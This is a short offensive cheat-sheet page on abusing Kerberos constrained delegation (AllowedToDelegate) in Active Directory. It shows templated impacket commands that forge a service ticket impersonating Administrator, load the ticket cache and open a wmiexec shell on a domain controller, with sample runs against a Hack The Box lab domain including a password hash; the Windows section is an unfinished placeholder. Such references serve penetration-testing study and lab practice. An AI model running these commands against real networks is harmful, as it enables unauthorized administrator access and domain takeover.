---
title: "AllowedToDelegate"
date: 2024-7-23
tags: ["Pass-The-Ticket", "Silver Ticket", "Ticket Granting Ticket", "Allowedtodelegate", "Active Directory", "Windows"]
---

### Privesc #1: Forge a Ticket

{{< tab set1 tab1 active >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Get a service ticket

```console
# For example, spn: www/dc.example.com (Check Bloodhound)
sudo ntpdate -s <DC> && impacket-getST -dc-ip <DC_IP> -spn <SERVICE>/<TARGET_DOMAIN> -hashes :<HASH> -impersonate Administrator '<DOMAIN>/<USER>'
```

```console {class="sample-code"}
$ sudo ntpdate -s dc.intelligence.htb && impacket-getST -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :80d4ea8c2d5ccfd1ebac5bd732ece5e4 -impersonate Administrator 'intelligence.htb/svc_int'
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

#### 2. Remote

```console
export KRB5CCNAME=<CCACHE_FILE>
```

```console {class="sample-code"}
$ export KRB5CCNAME=Administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

```console
sudo ntpdate -s <DC> && wmiexec.py -k -no-pass administrator@<DC>
```

```console {class="sample-code"}
$ sudo ntpdate -s dc.intelligence.htb && wmiexec.py -k -no-pass administrator@dc.intelligence.htb
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

<small>*Note: impacket-wmiexec may not work*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. TO-DO

```console
TO-DO
```

{{< /tabcontent >}}
